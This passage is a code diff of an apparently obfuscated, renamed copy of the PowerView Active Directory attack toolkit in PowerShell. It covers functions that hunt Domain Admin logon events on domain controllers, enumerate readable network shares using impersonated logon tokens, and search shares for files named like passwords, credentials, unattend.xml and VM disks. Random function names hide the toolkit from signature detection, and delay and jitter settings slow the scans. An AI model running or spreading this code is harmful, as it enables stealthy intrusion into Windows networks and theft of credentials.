+                    Write-Verbose "[delivers] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose "[snowshed] Using threading with threads: $wCkPnMUb99"
-            $qczwSIpm99 = @{
-                'ProcessName' = $lxBngDbp99
-                'TargetUsers' = $eKjwQtUM99
-                'Credential' = $gxazvivN99
+            Write-Verbose "[delivers] Using threading with threads: $Threads"
+            $ScriptParams = @{
+                'ProcessName' = $TargetProcessName
+                'TargetUsers' = $TargetUsers
+                'Credential' = $Credential
             }
-            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
+            wingnut -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
-function Valkyries {
+function contrives {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
@@ -8645,168 +8645,168 @@ function Valkyries {
         [Alias('dnshostname', 'HostName', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [Parameter(ParameterSetName = 'Domain')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Hashtable]
-        $kXbEpVCq99,
+        $Filter,
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $CtVXbzbF99 = [DateTime]::Now.AddDays(-1),
+        $StartTime = [DateTime]::Now.AddDays(-1),
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $FVDtcdtR99 = [DateTime]::Now,
+        $EndTime = [DateTime]::Now,
         [ValidateRange(1, 1000000)]
         [Int]
-        $OoLNhUlP99 = 5000,
+        $MaxEvents = 5000,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $rqcypngr99,
+        $UserIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $ojqqfkye99,
+        $UserDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $VlBmNldu99,
+        $UserLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $IXFyKHnF99,
+        $UserSearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('GroupName', 'Group')]
         [String[]]
-        $ZgtvBxHU99 = 'Domain Admins',
+        $UserGroupIdentity = 'Domain Admins',
         [Alias('AdminCount')]
         [Switch]
-        $tUgZHPlx99,
+        $UserAdminCount,
         [Switch]
-        $fXeDJWKC99,
+        $CheckAccess,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
-        $DCpfKYOf99,
+        $StopOnSuccess,
         [ValidateRange(1, 10000)]
         [Int]
         $Delay = 0,
         [ValidateRange(0.0, 1.0)]
         [Double]
-        $ohvTlzbv99 = .3,
+        $Jitter = .3,
         [Int]
         [ValidateRange(1, 100)]
-        $wCkPnMUb99 = 20
+        $Threads = 20
     )
     BEGIN {
-        $xUaDkcfD99 = @{
+        $UserSearcherArguments = @{
             'Properties' = 'samaccountname'
         }
-        if ($PSBoundParameters['UserIdentity']) { $xUaDkcfD99['Identity'] = $rqcypngr99 }
-        if ($PSBoundParameters['UserDomain']) { $xUaDkcfD99['Domain'] = $ojqqfkye99 }
-        if ($PSBoundParameters['UserLDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $VlBmNldu99 }
-        if ($PSBoundParameters['UserSearchBase']) { $xUaDkcfD99['SearchBase'] = $IXFyKHnF99 }
-        if ($PSBoundParameters['UserAdminCount']) { $xUaDkcfD99['AdminCount'] = $tUgZHPlx99 }
-        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
+        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
+        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
+        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
+        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
-            $eKjwQtUM99 = township @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+            $TargetUsers = prissier @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
-            $YREeWdxN99 = @{
-                'Identity' = $ZgtvBxHU99
+            $GroupSearcherArguments = @{
+                'Identity' = $UserGroupIdentity
                 'Recurse' = $True
             }
-            Write-Verbose "UserGroupIdentity: $ZgtvBxHU99"
-            if ($PSBoundParameters['UserDomain']) { $YREeWdxN99['Domain'] = $ojqqfkye99 }
-            if ($PSBoundParameters['UserSearchBase']) { $YREeWdxN99['SearchBase'] = $IXFyKHnF99 }
-            if ($PSBoundParameters['Server']) { $YREeWdxN99['Server'] = $mSxqoOjK99 }
-            if ($PSBoundParameters['SearchScope']) { $YREeWdxN99['SearchScope'] = $vaSWXjPs99 }
-            if ($PSBoundParameters['ResultPageSize']) { $YREeWdxN99['ResultPageSize'] = $mhcqrrQn99 }
-            if ($PSBoundParameters['ServerTimeLimit']) { $YREeWdxN99['ServerTimeLimit'] = $mvTbAWDU99 }
-            if ($PSBoundParameters['Tombstone']) { $YREeWdxN99['Tombstone'] = $rPozaKft99 }
-            if ($PSBoundParameters['Credential']) { $YREeWdxN99['Credential'] = $gxazvivN99 }
-            $eKjwQtUM99 = strippers @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            Write-Verbose "UserGroupIdentity: $UserGroupIdentity"
+            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
+            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
+            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
+            $TargetUsers = Aesculapius @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
         if ($PSBoundParameters['ComputerName']) {
-            $EqAZlVKw99 = $VrEmrUHq99
+            $TargetComputers = $ComputerName
         }
         else {
-            $zIQySoxi99 = @{
+            $DCSearcherArguments = @{
                 'LDAP' = $True
             }
-            if ($PSBoundParameters['Domain']) { $zIQySoxi99['Domain'] = $SSNUOPgW99 }
-            if ($PSBoundParameters['Server']) { $zIQySoxi99['Server'] = $mSxqoOjK99 }
-            if ($PSBoundParameters['Credential']) { $zIQySoxi99['Credential'] = $gxazvivN99 }
-            Write-Verbose "[Valkyries] Querying for domain controllers in domain: $SSNUOPgW99"
-            $EqAZlVKw99 = deplorably @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
+            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
+            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
+            Write-Verbose "[contrives] Querying for domain controllers in domain: $Domain"
+            $TargetComputers = Sarto @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        if ($EqAZlVKw99 -and ($EqAZlVKw99 -isnot [System.Array])) {
-            $EqAZlVKw99 = @(,$EqAZlVKw99)
+        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
+            $TargetComputers = @(,$TargetComputers)
         }
-        Write-Verbose "[Valkyries] TargetComputers length: $($EqAZlVKw99.Length)"
-        Write-Verbose "[Valkyries] TargetComputers $EqAZlVKw99"
-        if ($EqAZlVKw99.Length -eq 0) {
-            throw '[Valkyries] No hosts found to enumerate'
+        Write-Verbose "[contrives] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[contrives] TargetComputers $TargetComputers"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[contrives] No hosts found to enumerate'
         }
-        $kEgRxIzp99 = {
-            Param($VrEmrUHq99, $CtVXbzbF99, $FVDtcdtR99, $OoLNhUlP99, $eKjwQtUM99, $kXbEpVCq99, $gxazvivN99)
-            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
-                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
+        $HostEnumBlock = {
+            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)
+            ForEach ($TargetComputer in $ComputerName) {
+                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    $WacrwYam99 = @{
-                        'ComputerName' = $BumNVGRu99
+                    $DomainUserEventArgs = @{
+                        'ComputerName' = $TargetComputer
                     }
-                    if ($CtVXbzbF99) { $WacrwYam99['StartTime'] = $CtVXbzbF99 }
-                    if ($FVDtcdtR99) { $WacrwYam99['EndTime'] = $FVDtcdtR99 }
-                    if ($OoLNhUlP99) { $WacrwYam99['MaxEvents'] = $OoLNhUlP99 }
-                    if ($gxazvivN99) { $WacrwYam99['Credential'] = $gxazvivN99 }
-                    if ($kXbEpVCq99 -or $eKjwQtUM99) {
-                        if ($eKjwQtUM99) {
-                            niftiest @DomainUserEventArgs | Where-Object {$eKjwQtUM99 -contains $_.TargetUserName}
+                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }
+                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }
+                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }
+                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
+                    if ($Filter -or $TargetUsers) {
+                        if ($TargetUsers) {
+                            Alisa @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                         }
                         else {
-                            $pYHImtAf99 = 'or'
-                            $kXbEpVCq99.Keys | ForEach-Object {
+                            $Operator = 'or'
+                            $Filter.Keys | ForEach-Object {
                                 if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
-                                    if (($kXbEpVCq99[$_] -match '&') -or ($kXbEpVCq99[$_] -eq 'and')) {
-                                        $pYHImtAf99 = 'and'
+                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
+                                        $Operator = 'and'
                                     }
                                 }
                             }
-                            $Keys = $kXbEpVCq99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
-                            niftiest @DomainUserEventArgs | ForEach-Object {
-                                if ($pYHImtAf99 -eq 'or') {
+                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
+                            Alisa @DomainUserEventArgs | ForEach-Object {
+                                if ($Operator -eq 'or') {
                                     ForEach ($Key in $Keys) {
-                                        if ($_."$Key" -match $kXbEpVCq99[$Key]) {
+                                        if ($_."$Key" -match $Filter[$Key]) {
                                             $_
                                         }
                                     }
                                 }
                                 else {
                                     ForEach ($Key in $Keys) {
-                                        if ($_."$Key" -notmatch $kXbEpVCq99[$Key]) {
+                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                             break
                                         }
                                         $_
@@ -8816,7 +8816,7 @@ function Valkyries {
                         }
                     }
                     else {
-                        niftiest @DomainUserEventArgs
+                        Alisa @DomainUserEventArgs
                     }
                 }
             }
@@ -8824,139 +8824,139 @@ function Valkyries {
     }
     PROCESS {
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-            Write-Verbose "[Valkyries] Total number of hosts: $($EqAZlVKw99.count)"
-            Write-Verbose "[Valkyries] Delay: $Delay, Jitter: $ohvTlzbv99"
-            $zLofmUyR99 = 0
-            $ZqgWUqYA99 = New-Object System.Random
-            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
-                $zLofmUyR99 = $zLofmUyR99 + 1
-                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
-                Write-Verbose "[Valkyries] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
-                $fYOedlSN99 = Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $CtVXbzbF99, $FVDtcdtR99, $OoLNhUlP99, $eKjwQtUM99, $kXbEpVCq99, $gxazvivN99
-                $fYOedlSN99
-                if ($fYOedlSN99 -and $DCpfKYOf99) {
-                    Write-Verbose "[Valkyries] Target user found, returning early"
+            Write-Verbose "[contrives] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[contrives] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose "[contrives] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
+                $Result
+                if ($Result -and $StopOnSuccess) {
+                    Write-Verbose "[contrives] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose "[Valkyries] Using threading with threads: $wCkPnMUb99"
-            $qczwSIpm99 = @{
-                'StartTime' = $CtVXbzbF99
-                'EndTime' = $FVDtcdtR99
-                'MaxEvents' = $OoLNhUlP99
-                'TargetUsers' = $eKjwQtUM99
-                'Filter' = $kXbEpVCq99
-                'Credential' = $gxazvivN99
+            Write-Verbose "[contrives] Using threading with threads: $Threads"
+            $ScriptParams = @{
+                'StartTime' = $StartTime
+                'EndTime' = $EndTime
+                'MaxEvents' = $MaxEvents
+                'TargetUsers' = $TargetUsers
+                'Filter' = $Filter
+                'Credential' = $Credential
             }
-            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
+            wingnut -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
-function Suwanee {
+function symbolization {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ShareInfo')]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DNSHostName')]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [ValidateNotNullOrEmpty()]
         [Alias('Domain')]
         [String]
-        $cdytPdAI99,
+        $ComputerDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $glLCVedN99,
+        $ComputerLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $WrwfvIMy99,
+        $ComputerSearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('OperatingSystem')]
         [String]
-        $fGipudMB99,
+        $ComputerOperatingSystem,
         [ValidateNotNullOrEmpty()]
         [Alias('ServicePack')]
         [String]
-        $JKXRZnBu99,
+        $ComputerServicePack,
         [ValidateNotNullOrEmpty()]
         [Alias('SiteName')]
         [String]
-        $GtxmnElz99,
+        $ComputerSiteName,
         [Alias('CheckAccess')]
         [Switch]
-        $nvVkzIIC99,
+        $CheckShareAccess,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [ValidateRange(1, 10000)]
         [Int]
         $Delay = 0,
         [ValidateRange(0.0, 1.0)]
         [Double]
-        $ohvTlzbv99 = .3,
+        $Jitter = .3,
         [Int]
         [ValidateRange(1, 100)]
-        $wCkPnMUb99 = 20
+        $Threads = 20
     )
     BEGIN {
-        $tgaaoeGR99 = @{
+        $ComputerSearcherArguments = @{
             'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
-        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
-        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
-        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
-        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
-        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
-        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
-        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['ComputerName']) {
-            $EqAZlVKw99 = $VrEmrUHq99
+            $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[Suwanee] Querying computers in the domain'
-            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[symbolization] Querying computers in the domain'
+            $TargetComputers = sonorous @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[Suwanee] TargetComputers length: $($EqAZlVKw99.Length)"
-        if ($EqAZlVKw99.Length -eq 0) {
-            throw '[Suwanee] No hosts found to enumerate'
+        Write-Verbose "[symbolization] TargetComputers length: $($TargetComputers.Length)"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[symbolization] No hosts found to enumerate'
         }
-        $kEgRxIzp99 = {
-            Param($VrEmrUHq99, $nvVkzIIC99, $BmRRNCwx99)
-            if ($BmRRNCwx99) {
-                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
+        $HostEnumBlock = {
+            Param($ComputerName, $CheckShareAccess, $TokenHandle)
+            if ($TokenHandle) {
+                $Null = locale -TokenHandle $TokenHandle -Quiet
             }
-            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
-                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
+            ForEach ($TargetComputer in $ComputerName) {
+                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    $OPByCexH99 = well -ComputerName $BumNVGRu99
-                    ForEach ($Share in $OPByCexH99) {
-                        $cjvROwQJ99 = $Share.Name
-                        $Path = '\\'+$BumNVGRu99+'\'+$cjvROwQJ99
-                        if (($cjvROwQJ99) -and ($cjvROwQJ99.trim() -ne '')) {
-                            if ($nvVkzIIC99) {
+                    $Shares = tackier -ComputerName $TargetComputer
+                    ForEach ($Share in $Shares) {
+                        $ShareName = $Share.Name
+                        $Path = '\\'+$TargetComputer+'\'+$ShareName
+                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
+                            if ($CheckShareAccess) {
                                 try {
                                     $Null = [IO.Directory]::GetFiles($Path)
                                     $Share
@@ -8972,49 +8972,49 @@ function Suwanee {
                     }
                 }
             }
-            if ($BmRRNCwx99) {
-                Nina
+            if ($TokenHandle) {
+                choke
             }
         }
-        $WUqPycDr99 = $Null
+        $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99
+                $LogonToken = locale -Credential $Credential
             }
             else {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
+                $LogonToken = locale -Credential $Credential -Quiet
             }
         }
     }
     PROCESS {
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-            Write-Verbose "[Suwanee] Total number of hosts: $($EqAZlVKw99.count)"
-            Write-Verbose "[Suwanee] Delay: $Delay, Jitter: $ohvTlzbv99"
-            $zLofmUyR99 = 0
-            $ZqgWUqYA99 = New-Object System.Random
-            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
-                $zLofmUyR99 = $zLofmUyR99 + 1
-                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
-                Write-Verbose "[Suwanee] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
-                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $nvVkzIIC99, $WUqPycDr99
+            Write-Verbose "[symbolization] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[symbolization] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose "[symbolization] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
             }
         }
         else {
-            Write-Verbose "[Suwanee] Using threading with threads: $wCkPnMUb99"
-            $qczwSIpm99 = @{
-                'CheckShareAccess' = $nvVkzIIC99
-                'TokenHandle' = $WUqPycDr99
+            Write-Verbose "[symbolization] Using threading with threads: $Threads"
+            $ScriptParams = @{
+                'CheckShareAccess' = $CheckShareAccess
+                'TokenHandle' = $LogonToken
             }
-            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
+            wingnut -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function indignantly {
+function heights {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.FoundFile')]
     [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
@@ -9022,135 +9022,135 @@ function indignantly {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DNSHostName')]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $cdytPdAI99,
+        $ComputerDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $glLCVedN99,
+        $ComputerLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $WrwfvIMy99,
+        $ComputerSearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('OperatingSystem')]
         [String]
-        $fGipudMB99,
+        $ComputerOperatingSystem,
         [ValidateNotNullOrEmpty()]
         [Alias('ServicePack')]
         [String]
-        $JKXRZnBu99,
+        $ComputerServicePack,
         [ValidateNotNullOrEmpty()]
         [Alias('SiteName')]
         [String]
-        $GtxmnElz99,
+        $ComputerSiteName,
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
         [Alias('SearchTerms', 'Terms')]
         [String[]]
-        $CuygeMzO99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
+        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
         [ValidateNotNullOrEmpty()]
         [ValidatePattern('\\\\')]
         [Alias('Share')]
         [String[]]
-        $ynlwUfhB99,
+        $SharePath,
         [String[]]
-        $OxWrrBbt99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
+        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $uKMZoAej99,
+        $LastAccessTime,
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $QRdxeHwL99,
+        $LastWriteTime,
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $rZqUJwQL99,
+        $CreationTime,
         [Parameter(ParameterSetName = 'OfficeDocs')]
         [Switch]
-        $DXnIJKyo99,
+        $OfficeDocs,
         [Parameter(ParameterSetName = 'FreshEXEs')]
         [Switch]
-        $KMUtBgIc99,
+        $FreshEXEs,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
